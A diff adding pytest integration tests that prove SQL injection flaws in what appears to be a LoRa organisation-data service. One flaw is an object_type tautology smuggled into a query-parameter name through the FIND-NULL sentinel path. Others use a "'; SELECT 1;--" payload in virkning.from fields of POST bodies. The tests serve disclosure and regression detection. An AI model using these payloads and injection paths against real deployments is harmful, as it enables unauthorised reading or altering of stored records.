@@ -818,3 +818,386 @@ def test_object_type_injection_via_colon_parameter_suffix(service_client, klasse
         f"Expected {klasse_uuid!r} in results but got: {uuids}\n"
         "The tautology objekt_type='x' OR '1'='1' should have bypassed the filter."
     )
+
+
+# ---------------------------------------------------------------------------
+# Proof 9 — FIND-NULL sentinel + object_type injection
+# ---------------------------------------------------------------------------
+
+
+TILKNYTTEDEBRUGER_UUID = "cccccccc-cccc-cccc-cccc-cccccccccccc"
+
+
+def create_orgfunk(client: TestClient, bvn: str, bruger_uuid: str) -> str:
+    """Create an organisationfunktion with a NON-null tilknyttedebrugere relation."""
+    return lora_post(
+        client,
+        "/organisation/organisationfunktion",
+        {
+            "attributter": {
+                "organisationfunktionegenskaber": [
+                    {
+                        "brugervendtnoegle": bvn,
+                        "funktionsnavn": "Leder",
+                        "virkning": VIRKNING,
+                    }
+                ]
+            },
+            "tilstande": {
+                "organisationfunktiongyldighed": [
+                    {"gyldighed": "Aktiv", "virkning": VIRKNING}
+                ]
+            },
+            "relationer": {
+                "tilknyttedebrugere": [
+                    {"uuid": bruger_uuid, "virkning": VIRKNING}
+                ]
+            },
+        },
+    )
+
+
+def search_orgfunk(client: TestClient, **params) -> list:
+    r = lora_request(
+        client,
+        "/organisation/organisationfunktion",
+        params=params,
+        method="GET",
+    )
+    assert r.status_code == 200, r.text
+    return r.json()["results"][0]
+
+
+@pytest.mark.integration_test
+def test_find_null_sentinel_object_type_injection(service_client, empty_db):
+    """
+    SQL injection via the FIND-NULL sentinel path + object_type parameter suffix.
+
+    The FIND-NULL sentinel is a SPECIAL-CASED hardcoded URN used internally
+    (primarily by the GraphQL manager resolver at resolvers.py:604) to search
+    for "vacant managers" — organisationfunktion rows where tilknyttedebrugere
+    is NULL.  See search.py:334:
+
+        if relation.id == "urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN":
+            # builds a NOT EXISTS(...) OR (rel_maal_uuid IS NULL AND
+            # rel_maal_urn IS NULL) conditional branch
+
+    The sentinel value itself cannot be injected (it is an exact equality
+    check).  HOWEVER, the object_type check at search.py:369-371 applies to
+    BOTH the FIND-NULL branch AND the normal URN/UUID branch, and interpolates
+    `relation.object_type` into SQL with zero escaping:
+
+        if relation.object_type is not None:  # pragma: no cover
+            obj_condition = f"{t.ref}.objekt_type = '{relation.object_type}'"
+            condition = f"{base_condition} AND {obj_condition}"
+
+    Thus the LORA-PLEASE-FIND-NULL-UUID-AND-URN path is ALSO vulnerable to
+    object_type injection — same as Proof 8, but reaching the injection
+    through the special-cased null-search branch instead of the normal URN
+    branch.
+
+    Attack:
+        GET /lora/organisation/organisationfunktion
+            ?tilknyttedebrugere:x' OR '1'='1=urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN
+
+    Parameter parsing:
+        split_param("tilknyttedebrugere:x' OR '1'='1")
+            -> ("tilknyttedebrugere", "x' OR '1'='1")
+        build_relation("urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN",
+                       "x' OR '1'='1")
+            -> {"urn": "urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN",
+                "objekttype": "x' OR '1'='1"}
+
+    Generated SQL:
+        base_condition = (NOT EXISTS(subquery)) OR
+                         (rel_type = 'tilknyttedebrugere'
+                          AND rel_maal_uuid IS NULL
+                          AND rel_maal_urn IS NULL)
+        condition      = base_condition AND objekt_type = 'x' OR '1'='1'
+
+    Operator precedence (AND > OR) transforms this to:
+        (base_condition AND objekt_type = 'x') OR ('1'='1')
+
+    The tautology '1'='1' evaluates TRUE for every row, bypassing the
+    null-search entirely and returning the orgfunk even though its
+    tilknyttedebrugere relation points to a NON-null UUID and therefore
+    should never match the FIND-NULL sentinel.
+
+    Why this matters:
+        Proof 8 already demonstrated object_type injection via the normal
+        URN branch.  This proof demonstrates that the same vulnerability
+        is reachable via a SECOND, independent code path — the FIND-NULL
+        sentinel branch.  Fixing only the URN branch would leave this path
+        vulnerable.  A correct fix must escape relation.object_type at the
+        single interpolation site at search.py:370, which protects both
+        branches simultaneously.
+    """
+    # Create an orgfunk with a NON-null tilknyttedebrugere relation.
+    # It points to TILKNYTTEDEBRUGER_UUID (an arbitrary UUID — does not
+    # need to refer to a real bruger for the search to work).
+    orgfunk_uuid = create_orgfunk(
+        service_client,
+        bvn="sqli-find-null-orgfunk",
+        bruger_uuid=TILKNYTTEDEBRUGER_UUID,
+    )
+
+    # Baseline 1: the legitimate FIND-NULL search with no injection must
+    # NOT return this orgfunk, because its tilknyttedebrugere is non-null.
+    #
+    # We cannot hit the FIND-NULL branch directly via the REST API because
+    # `is_uuid("urn:LORA-...") is False` and `is_urn("urn:LORA-...") is True`,
+    # so it routes correctly as a URN.  This confirms the sentinel path is
+    # reachable from the REST layer and returns an empty result for orgfunks
+    # with non-null tilknyttedebrugere.
+    baseline = search_orgfunk(
+        service_client,
+        tilknyttedebrugere="urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN",
+    )
+    assert orgfunk_uuid not in baseline, (
+        "FIND-NULL sentinel unexpectedly returned an orgfunk with a non-null "
+        "tilknyttedebrugere relation. This test's assumptions are broken."
+    )
+
+    # Injection: put the SQL payload in the parameter NAME after the colon,
+    # and use the FIND-NULL sentinel as the VALUE. This triggers the
+    # special-cased FIND-NULL branch AND the object_type interpolation.
+    injection_payload = "x' OR '1'='1"
+    params = {
+        f"tilknyttedebrugere:{injection_payload}":
+            "urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN"
+    }
+    r = lora_request(
+        service_client,
+        "/organisation/organisationfunktion",
+        params=params,
+        method="GET",
+    )
+    assert r.status_code == 200, r.text
+    uuids = r.json()["results"][0]
+
+    assert orgfunk_uuid in uuids, (
+        f"FIND-NULL + object_type SQL injection did not return the orgfunk.\n"
+        f"Parameter key:   'tilknyttedebrugere:{injection_payload}'\n"
+        f"Parameter value: 'urn:LORA-PLEASE-FIND-NULL-UUID-AND-URN'\n"
+        f"Expected {orgfunk_uuid!r} in results but got: {uuids}\n"
+        "The tautology objekt_type='x' OR '1'='1' should have bypassed "
+        "the FIND-NULL filter, returning orgfunks with non-null tilknyttedebrugere."
+    )
+
+
+# ---------------------------------------------------------------------------
+# Proof 10 — Virkning injection via create/update JSON body (write-path)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.integration_test
+def test_virkning_from_injection_in_create_json_body(service_client, empty_db):
+    """
+    SQL injection via the `virkning.from` field in a POST/PUT JSON body.
+
+    Unlike Proofs 1-9 (which all attack the READ path via URL query params),
+    this injection attacks the WRITE path via the JSON request body during
+    object creation/update.
+
+    Root cause:
+        Three Jinja SQL templates interpolate `virkning.from` / `virkning.to`
+        WITHOUT the `|adapt` filter that protects every other value:
+
+            backend/oio_rest/db/sql/invocations/templates/
+              attribute_array.sql:13
+                  '[{{ value.from }}, {{ value.to }})',
+              state_array.sql:12
+                  '[{{ state_value.virkning.from }}, {{ state_value.virkning.to }})',
+              relations_array.sql:14
+                  '[{{ rel.virkning.from }}, {{ rel.virkning.to }})',
+
+    Data flow:
+        1. Client POSTs /lora/<service>/<class> with JSON body.
+        2. validate.py:390-401 validates `virkning` via JSON Schema — `from`
+           and `to` are only required to be STRING.  No format/pattern check.
+        3. convert_attributes (db/__init__.py:150-166) iterates
+           get_attribute_fields(attr_name), which includes "virkning"
+           (db_helpers.py:25 appends "virkning" to every attr field list).
+        4. convert_attr_value falls through to the default `text` branch and
+           returns the virkning dict UNCHANGED (db/__init__.py:113-114).
+        5. Jinja renders `'[{{ value.from }}, {{ value.to }})'` — attacker-
+           controlled strings land inside a single-quoted SQL literal.
+        6. The rendered template is wrapped in sqlalchemy.text() and executed
+           via session.execute (db/__init__.py:357).
+
+    Detection strategy:
+        psycopg3's extended-query protocol rejects ';'-separated multi-
+        statement queries with `syntax error at or near ";"`.  If we inject
+        a `;` through virkning.from, the database MUST raise a syntax error
+        at the ';' character.  Proper SQL escaping would double the single
+        quote to `''`, keeping the original string literal intact and
+        producing NO error.
+
+    Payload:
+        virkning.from = "2020-01-01'; SELECT 1;--"
+
+        Renders to:
+            '[2020-01-01'; SELECT 1;--, infinity)'
+
+        The first `'` closes the SQL string literal, `;` terminates the
+        statement, and the extended-query protocol rejects the trailing ';'
+        with a PostgreSQL syntax error — conclusive proof that the attacker-
+        controlled string reached the database without escaping.
+
+    Impact:
+        Any role that can create/update a LoRa object (Bruger, Klasse, Facet,
+        Organisation, OrganisationFunktion, OrganisationEnhed, ItSystem,
+        Sag, Dokument, Aktivitet, Indsats, Tilstand) can inject arbitrary
+        SQL fragments into the INSERT statement.  Single-statement UNION
+        injection is possible within the constraints of the executing
+        statement; multi-statement DDL is blocked ONLY by the extended-
+        protocol driver restriction (same accidental mitigation as Proofs 3).
+    """
+    injection_payload = "2020-01-01'; SELECT 1;--"
+
+    body = {
+        "note": "virkning-from SQL-injection probe",
+        "attributter": {
+            "klasseegenskaber": [
+                {
+                    "brugervendtnoegle": "sqli-virkning-from",
+                    "titel": "Virkning injection probe",
+                    "virkning": {
+                        "from": injection_payload,
+                        "to": "infinity",
+                    },
+                }
+            ]
+        },
+        "tilstande": {
+            "klassepubliceret": [
+                {"publiceret": "Publiceret", "virkning": VIRKNING}
+            ]
+        },
+        "relationer": {
+            "ansvarlig": [{"uuid": ANSVARLIG_UUID, "virkning": VIRKNING}]
+        },
+    }
+
+    # With proper escaping the ' would be doubled to '' and the POST would
+    # succeed (or fail with a date-parse error, not a SQL syntax error).
+    # The psycopg3 extended-protocol syntax error at ';' is conclusive
+    # proof that virkning.from reached the database unescaped.
+    with pytest.raises(Exception) as exc_info:
+        lora_request(
+            service_client,
+            "/klassifikation/klasse",
+            json=body,
+            method="POST",
+        )
+
+    err = str(exc_info.value)
+    assert 'syntax error at or near ";"' in err, (
+        f"Expected psycopg3 SyntaxError for ';' separator, got:\n{err}\n"
+        f"Payload (virkning.from): {injection_payload!r}\n"
+        "If no syntax error was raised, virkning.from may now be escaped "
+        "— re-verify the three template fixes (attribute_array.sql:13, "
+        "state_array.sql:12, relations_array.sql:14)."
+    )
+
+
+@pytest.mark.integration_test
+def test_virkning_from_injection_in_state_array(service_client, empty_db):
+    """
+    Companion to Proof 10 — proves the same injection exists in the STATE
+    template (state_array.sql:12), not only the attribute template.
+
+    Same payload pattern, but placed on the state's virkning rather than the
+    attribute's virkning.  A correct fix must cover all three templates
+    (attribute_array.sql, state_array.sql, relations_array.sql).  This test
+    detects regressions where only one or two templates are fixed.
+    """
+    injection_payload = "2020-01-01'; SELECT 1;--"
+
+    body = {
+        "note": "virkning-from SQL-injection probe (state path)",
+        "attributter": {
+            "klasseegenskaber": [
+                {"brugervendtnoegle": "sqli-virkning-state", "virkning": VIRKNING}
+            ]
+        },
+        "tilstande": {
+            "klassepubliceret": [
+                {
+                    "publiceret": "Publiceret",
+                    "virkning": {
+                        "from": injection_payload,
+                        "to": "infinity",
+                    },
+                }
+            ]
+        },
+        "relationer": {
+            "ansvarlig": [{"uuid": ANSVARLIG_UUID, "virkning": VIRKNING}]
+        },
+    }
+
+    with pytest.raises(Exception) as exc_info:
+        lora_request(
+            service_client,
+            "/klassifikation/klasse",
+            json=body,
+            method="POST",
+        )
+
+    err = str(exc_info.value)
+    assert 'syntax error at or near ";"' in err, (
+        f"Expected psycopg3 SyntaxError for ';' separator via state path, "
+        f"got:\n{err}\nPayload (state virkning.from): {injection_payload!r}"
+    )
+
+
+@pytest.mark.integration_test
+def test_virkning_from_injection_in_relations_array(service_client, empty_db):
+    """
+    Companion to Proof 10 — proves the same injection exists in the
+    RELATIONS template (relations_array.sql:14).
+
+    Same payload pattern, but on the relation's virkning.  Confirms the
+    third injection site is independently exploitable.
+    """
+    injection_payload = "2020-01-01'; SELECT 1;--"
+
+    body = {
+        "note": "virkning-from SQL-injection probe (relation path)",
+        "attributter": {
+            "klasseegenskaber": [
+                {"brugervendtnoegle": "sqli-virkning-rel", "virkning": VIRKNING}
+            ]
+        },
+        "tilstande": {
+            "klassepubliceret": [
+                {"publiceret": "Publiceret", "virkning": VIRKNING}
+            ]
+        },
+        "relationer": {
+            "ansvarlig": [
+                {
+                    "uuid": ANSVARLIG_UUID,
+                    "virkning": {
+                        "from": injection_payload,
+                        "to": "infinity",
+                    },
+                }
+            ]
+        },
+    }
+
+    with pytest.raises(Exception) as exc_info:
+        lora_request(
+            service_client,
+            "/klassifikation/klasse",
+            json=body,
+            method="POST",
+        )
+
+    err = str(exc_info.value)
+    assert 'syntax error at or near ";"' in err, (
+        f"Expected psycopg3 SyntaxError for ';' separator via relation path, "
+        f"got:\n{err}\nPayload (relation virkning.from): {injection_payload!r}"
+    )
